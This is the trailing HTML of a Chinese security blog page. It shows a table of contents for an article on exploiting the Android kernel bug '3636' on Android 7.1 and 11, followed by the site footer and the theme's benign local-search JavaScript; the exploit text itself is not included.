          完整exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-number">1.4.</span> <span class="toc-text">
          一些注意点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#android-7-1-%E7%8E%AF%E5%A2%83%E4%B8%8B3636%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">
          android 7.1 环境下3636的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-1"><span class="toc-number">2.1.</span> <span class="toc-text">
          基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1"><span class="toc-number">2.2.</span> <span class="toc-text">
          漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-1"><span class="toc-number">2.3.</span> <span class="toc-text">
          漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A7%E5%88%B6%E6%B5%81%E5%8A%AB%E6%8C%81-physmap-spray-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">
          控制流劫持 - physmap spray</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-root-shell-pipe-r-w"><span class="toc-number">2.3.2.</span> <span class="toc-text">
          get root shell - pipe r&#x2F;w</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#get-root-shell-kernel-rop"><span class="toc-number">2.3.3.</span> <span class="toc-text">
          get root shell - kernel rop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E7%A7%8Dexp-pipe-r-w-mutex-trylock-%E6%B3%84%E9%9C%B2"><span class="toc-number">2.3.4.</span> <span class="toc-text">
          第一种exp - pipe r&#x2F;w + mutex_trylock()泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E7%A7%8Dexp-pipe-r-w-JOP%E6%B3%84%E9%9C%B2"><span class="toc-number">2.3.5.</span> <span class="toc-text">
          第二种exp - pipe r&#x2F;w + JOP泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E7%A7%8Dexp-%E7%BA%AF-kernel-ROP"><span class="toc-number">2.3.6.</span> <span class="toc-text">
          第三种exp - 纯 kernel ROP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#android-11-%E7%8E%AF%E5%A2%83%E4%B8%8B3636%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">
          android 11 环境下3636的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF-2"><span class="toc-number">3.1.</span> <span class="toc-text">
          基本信息</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/uploads/zhishi1.jpg" alt="avatar"></div></div><div class="sidebar-ov-social"><a class="sidebar-ov-social-item" href="https://github.com/blingblingxuanxuan" target="_blank" rel="noopener" data-popover="Github" data-popover-pos="up"><span class="sidebar-ov-social-item__icon"><i class="fab fa-github"></i></span></a></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">76</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">15</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">42</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2023</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>blingbling</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.3.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div><div class="busuanzi"><span class="busuanzi-siteuv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="访问人数"><i class="fas fa-user"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_uv"></span></span><span class="busuanzi-sitepv"><span class="busuanzi-siteuv__icon" data-popover-pos="up" data-popover="浏览总量"><i class="fas fa-eye"></i></span><span class="busuanzi-siteuv__value" id="busuanzi_value_site_pv"></span></span></div><div>Just follow your heart, and keep smiling.</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><script>function initSearch() {
  var isXML = true;
  var search_path = 'search.json';

  if (!search_path) {
    search_path = 'search.xml';
  } else if (/json$/i.test(search_path)) {
    isXML = false;
  }

  var path = '/' + search_path;
  $.ajax({
    url: path,
    dataType: isXML ? 'xml' : 'json',
    async: true,
    success: function (res) {
      var datas = isXML ? $('entry', res).map(function () {
        // 将 XML 转为 JSON
        return {
          title: $('title', this).text(),
          content: $('content', this).text(),
          url: $('url', this).text()
        };
      }).get() : res;
      var $input = $('.search-input input');
      var $result = $('.search-results');
      // 搜索对象（标题、内容）的权重，影响显示顺序
      var WEIGHT = { title: 100, content: 1 };
      var searchPost = function () {
        var searchText = $input.val().toLowerCase().trim();
        // 根据空白字符分隔关键字
        var keywords = searchText.split(/[\s]+/);
        // 搜索结果
        var matchPosts = [];

        // 有多个关键字时，将原文字整个保存下来
        if (keywords.length > 1) {
          keywords.push(searchText);
        }
        // 防止未输入字符时搜索
        if (searchText.length > 0) {
          datas.forEach(function (data) {
            var isMatch  = false;
            // 没有标题的文章使用预设的 i18n 变量代替
            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
            var titleLower = title && title.toLowerCase();
            // 删除 HTML 标签 和 所有空白字符
            var content = data.content && data.content.replace(/<[^>]+>/g, '');
            var contentLower = content && content.toLowerCase();
            // 删除重复的 /
            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
            // 标题中匹配到的关键词
            var titleHitSlice = [];
            // 内容中匹配到的关键词
            var contentHitSlice = [];

            keywords.forEach(function (keyword) {
              /**
              * 获取匹配的关键词的索引
              * @param {String} keyword 要匹配的关键字
              * @param {String} text 原文字
              * @param {Boolean} caseSensitive 是否区分大小写
              * @param {Number} weight 匹配对象的权重。权重大的优先显示
              * @return {Array}
              */
              function getIndexByword (word, text, caseSensitive, weight) {
                if (!word || !text) {
                  return [];
                };

                var startIndex = 0; // 每次匹配的开始索引
                var index = -1;     // 匹配到的索引值
                var result = [];    // 匹配结果

                if (!caseSensitive) {
                  word = word.toLowerCase();
                  text = text.toLowerCase();
                }

                while((index = text.indexOf(word, startIndex)) !== -1) {
                  var hasMatch = false;
                  // 索引位置相同的关键词，保留长度较长的
                  titleHitSlice.forEach(function (hit) {
                    if (hit.index === index && hit.word.length < word.length) {
                      hit.word = word;
                      hasMatch = true;
                    }
                  });
                  startIndex = index + word.length;
                  !hasMatch && result.push({ index: index, word: word, weight: weight });
                }
                return result;
              }
              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
            });

            var hitTitle = titleHitSlice.length;
            var hitContent = contentHitSlice.length;

            if (hitTitle > 0 || hitContent > 0) {
              isMatch = true;
            }
            if (isMatch) {
              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
                // 按照匹配文字的索引的递增顺序排序
                hit.sort(function (left, right) {
                  return left.index - right.index;
                });
              });
              /**
              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
              * @param {String} text 原文本
              * @param {Array} hitSlice 匹配项的索引信息
              * @param {Number} start 开始索引
              * @param {Number} end 结束索引
              * @return {String}
              */
              function highlightKeyword (text, hitSlice, start, end) {
                if (!text || !hitSlice || !hitSlice.length) {
                  return;
                }

                var result = '';
                var startIndex = start;
                var endIndex = end;
                hitSlice.forEach(function (hit) {
                  if (hit.index < startIndex) {
                    return;
                  }

                  var hitWordEnd = hit.index + hit.word.length;
                  result += text.slice(startIndex, hit.index);
                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
                  startIndex = hitWordEnd;
                });
                result += text.slice(startIndex, endIndex);
                return result;
              }

              var postData = {};
              // 文章总的搜索权重
              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
              // 标记匹配关键词后的标题
              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
              // 标记匹配关键词后的内容
              var postContent;
              // 显示内容的长度
              var SHOW_WORD_LENGTH = 200;
              // 命中关键词前的字符显示长度
              var SHOW_WORD_FRONT_LENGTH = 20;
              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;

              // 截取匹配的第一个字符，前后共 200 个字符来显示
              if (contentHitSlice.length > 0) {
                var firstIndex = contentHitSlice[0].index;
                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
                var end = firstIndex + SHOW_WORD_END_LENGTH;
                postContent = highlightKeyword(content, contentHitSlice, start, end);
              } else { // 未匹配到内容，直接截取前 200 个字符来显示
                postContent = content.slice(0, SHOW_WORD_LENGTH);
              }
              postData.title = postTitle;
              postData.content = postContent;
              postData.url = postURL;
              postData.weight = postWeight;
              matchPosts.push(postData);
            }
          });
        }

        var resultInnerHtml = '';
        if (matchPosts.length) {
          // 按权重递增的顺序排序，使权重大的优先显示
          matchPosts.sort(function (left, right) {
            return right.weight - left.weight;
          });
          resultInnerHtml += '<ul>';
          matchPosts.forEach(function (post) {
            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
            resultInnerHtml += post.title;
            resultInnerHtml += '</a><div class="search-results-content">';
            resultInnerHtml += post.content;
            resultInnerHtml += '</div></li>';
          });
          resultInnerHtml += '</ul>';
        } else {
          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
        }
        $result.html(resultInnerHtml);
      };
      $input.on('input', searchPost);
      $input.on('keyup', function (e) {
        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
          searchPost();
        }
      });
    }
  });
}

function closeSearch () {
  $('body').css({ overflow: 'auto' });
  $('.search-popup').css({ display: 'none' });
  $('.search-mask').css({ display: 'none' });
}

window.addEventListener('DOMContentLoaded', function () {
  Stun.utils.pjaxReloadLocalSearch = function () {
    $('.header-nav-search').on('click', function (e) {
      e.stopPropagation();
      $('body').css('overflow', 'hidden');
      $('.search-popup')
        .velocity('stop')
        .velocity('transition.expandIn', {
          duration: 300,
          complete: function () {
            $('.search-popup input').focus();
          }
        });
      $('.search-mask')
        .velocity('stop')
        .velocity('transition.fadeIn', {
          duration: 300
        });

      initSearch();
    });
    $('.search-mask, .search-close').on('click', function () {
      closeSearch();
    });
    $(document).on('keydown', function (e) {
      // Escape <=> 27
      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
        closeSearch();
      }
    });
  };

  Stun.utils.pjaxReloadLocalSearch();
}, false);

function safeOpenUrl(url) {
  var newTab = window.open();
  newTab.opener = null;
  newTab.location = url;
}

function extSearch(engine) {
  var engines = {
    google: 'https://www.google.com/search?q=',
    bing: 'https://cn.bing.com/search?q=',
    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
  };
  var host = window.location.host;
  var query = $('.search-input input').val().toLowerCase().trim();
  var uri = engines[engine] + query + ' site:' + host;

  if (query) {
    safeOpenUrl(uri);
  } else {
    Stun.utils.popAlert('warning', '请输入字符');
  }
}

var assistSearchList = window.CONFIG.assistSearch;

if (Array.isArray(assistSearchList)) {
  assistSearchList.forEach(function (name) {
    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
      extSearch(name);
    }, false);
  });
}</script><script src="https://cdn.jsdelivr.net/gh/sukkaw/busuanzi@latest/bsz.pure.mini.js" async></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>